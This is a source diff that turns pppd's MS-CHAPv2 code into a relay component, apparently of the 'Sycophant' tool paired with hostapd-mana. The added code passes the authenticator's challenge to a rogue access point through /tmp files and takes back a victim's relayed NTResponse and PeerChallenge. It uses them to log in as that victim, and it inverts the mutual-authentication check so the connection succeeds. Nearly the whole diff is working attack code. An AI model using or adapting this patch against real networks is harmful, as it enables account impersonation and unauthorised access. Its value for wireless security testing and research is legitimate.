@@ -94,7 +94,15 @@
 #include "pppcrypt.h"
 #include "magic.h"
 
-
+// MICHAEL WAS HERE
+char* outFileName = "/tmp/CHALLENGE";
+char* inFileName = "/tmp/RESPONSE";
+char* statefile = "/tmp/SYCOPHANT_STATE";
+char* validateFileName = "/tmp/VALIDATE";
+FILE* inFile;
+FILE* outFile;
+FILE* validateFile;
+// MICHAEL STOPPED HERE
 
 static void	ascii2unicode __P((char[], int, u_char[]));
 static void	NTPasswordHash __P((u_char *, int, u_char[MD4_SIGNATURE_SIZE]));
@@ -164,6 +172,7 @@ static void
 chapms_generate_challenge(unsigned char *challenge)
 {
 	*challenge++ = 8;
+	
 #ifdef DEBUGMPPEKEY
 	if (mschap_challenge && strlen(mschap_challenge) == 8)
 		memcpy(challenge, mschap_challenge, 8);
@@ -410,10 +419,37 @@ chapms2_check_success(int id, unsigned char *msg, int len)
 		error("MS-CHAPv2 Success packet is badly formed.");
 		return 0;
 	}
+	info("SYCOPHANT CHECKING SUCCESSS\n");
+
+	info("SYCOPHANT WRITING DOWN VERIFICATION FOR hostapd-mana client\n");
+	info("SYCOPHANT VERIFICATION - %s\n",msg); 
+	validateFile = fopen(validateFileName, "wb");
+
+	if( validateFile == NULL )
+		printf("Open Error");
+
+	u_char line [20]; 
+	memcpy(line, msg, 20);
+
+	info("SYCOPHANT VALIDATE DATA CREATED BY VICTIM", line, 20);
+ 	fwrite(line,20,1,validateFile); 
+	fclose(validateFile);
+	// Inform of our readyness
+	// char* outLockName = "CHALLENGE_LOCK";
+	info("SYCOPHANT INFORMING MANA TO SERVE VALID RESPONSE");
+	FILE* sycophantState;
+	char* sycophantStateName = "/tmp/SYCOPHANT_STATE";
+	sycophantState = fopen(sycophantStateName, "wb");
+	char * sup_state = "V";
+	fwrite(sup_state,1,1,sycophantState);
+
+	fclose(sycophantState);
+	
 	msg += 2;
 	len -= 2;
+	// SYCOPHANT, NEGATE THE FAILURE SO WE CAN CONNECT
 	if (len < MS_AUTH_RESPONSE_LENGTH
-	    || !chapms2_find_in_response_cache(id, NULL /* challenge */, msg)) {
+	    || chapms2_find_in_response_cache(id, NULL /* challenge */, msg)) {
 		/* Authenticator Response did not match expected. */
 		error("MS-CHAPv2 mutual authentication failed.");
 		return 0;
@@ -428,6 +464,8 @@ chapms2_check_success(int id, unsigned char *msg, int len)
 		error("MS-CHAPv2 Success packet is badly formed.");
 		return 0;
 	}
+
+
 	return 1;
 }
 
@@ -508,6 +546,7 @@ ChallengeResponse(u_char *challenge,
 		  u_char response[24])
 {
     u_char    ZPasswordHash[21];
+	info("SYCOPHANT Generated Response\n");
 
     BZERO(ZPasswordHash, sizeof(ZPasswordHash));
     BCOPY(PasswordHash, ZPasswordHash, MD4_SIGNATURE_SIZE);
@@ -543,6 +582,8 @@ ChallengeHash(u_char PeerChallenge[16], u_char *rchallenge,
 	++user;
     else
 	user = username;
+
+	dbglog("SYCOPHANT ChallengeHash Username for generating final 8-oct challenge: %s",user);
 
     SHA1_Init(&sha1Context);
     SHA1_Update(&sha1Context, PeerChallenge, 16);
@@ -603,6 +644,7 @@ ChapMS_NT(u_char *rchallenge, char *secret, int secret_len,
     /* Hash the Unicode version of the secret (== password). */
     ascii2unicode(secret, secret_len, unicodePassword);
     NTPasswordHash(unicodePassword, secret_len * 2, PasswordHash);
+	// dbglog("SYCOPHANT OLD CHALLENGE INTO DES: %.*B",16,rchallenge);
 
     ChallengeResponse(rchallenge, PasswordHash, NTResponse);
 }
@@ -615,13 +657,144 @@ ChapMS2_NT(u_char *rchallenge, u_char PeerChallenge[16], char *username,
     u_char	PasswordHash[MD4_SIGNATURE_SIZE];
     u_char	Challenge[8];
 
+	// SYCOPHANT START
+	dbglog("SYCOPHANT ChallengeHash Username: %s",username);
+	dbglog("SYCOPHANT ChallengeHash PeerChallenge: %.*B",16,PeerChallenge);
+	dbglog("SYCOPHANT ChallengeHash rchallenge: %.*B",16,rchallenge);
+
+	// char* outFileName = "CHALLENGE_FILE.txt";
+	outFile = fopen(outFileName, "wb");
+
+	if( outFile == NULL )
+	{
+		printf("Open Error");
+	}
+
+	fwrite(rchallenge,16,1,outFile); 
+	
+	dbglog("SYCOPHANT : CHALLANGE DATA GIVEN TO MANA");
+
+	fclose(outFile);
+
+	FILE* sycophantState;
+	sycophantState = fopen(statefile, "wb");
+	
+	char sup_state[2] = "C";
+	fwrite(sup_state,1,1,sycophantState);
+
+	fread(sup_state,1,1,sycophantState);
+	dbglog("SYCOPHANT got state %s",sup_state);
+
+	fclose(sycophantState);
+	dbglog("SYCOPHANT : INFORMING MANA TO SERVE CHALLENGE");
+
+	// SYCOPHANT END	
+
     ChallengeHash(PeerChallenge, rchallenge, username, Challenge);
 
+	
+	// dbglog("SYCOPHANT : INFORMING MANA TO SERVE CHALLENGE");
     /* Hash the Unicode version of the secret (== password). */
     ascii2unicode(secret, secret_len, unicodePassword);
     NTPasswordHash(unicodePassword, secret_len * 2, PasswordHash);
+	// dbglog("SYCOPHANT NEW CHALLENGE INTO DES: %.*B",16,&rchallenge);
 
     ChallengeResponse(Challenge, PasswordHash, NTResponse);
+	dbglog("SYCOPHANT ChallengeResponse - response %.24B", NTResponse);
+	dbglog("SYCOPHANT ChallengeResponse - PeerChallenge %.16B", PeerChallenge);
+	// FILE* sycophantState;
+
+	// FILE * sycophantState2;
+	// char sup_state[2] = "*";
+
+	// sup_state = "*";
+	// dbglog("SYCOPHANT current state %s",sup_state);
+	dbglog("SYCOPHANT waiting for response from Mana");
+	usleep(100000);
+	while(strcmp(sup_state,"R") != 0){
+		// dbglog("SYCOPHANT TEST");
+		sycophantState = fopen(statefile,"rb");
+		// dbglog("SYCOPHANT fopen");
+		if( sycophantState == NULL){
+			dbglog ("SYCOPHANT : NOT RELAYING");
+			break;
+		} else {
+			// fseek(sycophantState, 0, SEEK_END);
+			// size = ftell(sycophantState);
+			// rewind(sycophantState);
+			// if (size > 0){
+			// wpa_printf(MSG_INFO,"Testing %s",sup_state);
+			// dbglog("SYCOPHANT current state %s",sup_state);
+			// dbglog("SYCOPHANT read state");
+			fread(sup_state,1,1,sycophantState);
+			// dbglog("SYCOPHANT got state %s",sup_state);
+			// }
+			fclose(sycophantState);
+			if (strcmp(sup_state,"Z")==0){
+				break;
+			}
+			usleep(100000);
+		}
+	}
+
+	dbglog("SYCOPHANT Ingesting Response");
+	if(strcmp(sup_state,"R") == 0){
+		inFile = fopen(inFileName, "rb");
+
+		if( inFile == NULL ){
+			// continue;
+			dbglog("Response File open error, segfault incomming");
+		}
+		int size = 0;
+
+		dbglog("SYCOPHANT Seaking Length");
+		fseek(inFile, 0, SEEK_END);
+		size = ftell(inFile);
+		rewind(inFile);
+
+		// if(size > 0){
+		u_char line [size]; 
+
+		dbglog("SYCOPHANT Reading response from file");
+		fread(line, size, 1, inFile);
+
+		dbglog("SYCOPHANT : MANA CONTENTS %.*B",
+			size, line);
+		dbglog("SYCOPHANT : MANA SIZE %d",
+			size);
+		// wpa_hexdump(MSG_INFO, "SYCOPHANT : MANA CONTENTS",
+		// 	line, resp->used);
+		printf("SYCOPHANT LINE ");
+		for (int i = 0; i < 25; i++){
+			// dbglog("%s",line[i]);
+			NTResponse[i] = line[i+34];
+		}
+		for (int c = 0; c < 17; c++){
+			// dbglog("%s",line[i]);
+			PeerChallenge[c] = line[c+10];
+		}
+
+		dbglog("SYCOPHANT : NTResponse CONTENTS %.*B", 24, NTResponse);
+		
+		fclose(inFile);
+		// Clear the file
+		inFile = fopen(inFileName, "wb");
+		fclose(inFile);
+
+		// sycophantState = fopen(statefile,"wb");
+		// if( sycophantState == NULL )
+		// 	printf("Open Error Lock");
+
+		// sup_state[0] = 'Z';
+		// fwrite(sup_state,1,1,sycophantState);
+
+		// // fwrite('Z',1,1,sycophantState);
+		// fclose(sycophantState);
+
+	}
+
+	// MICHAEL STOPED HERE
+
 }
 
 #ifdef MSLANMAN
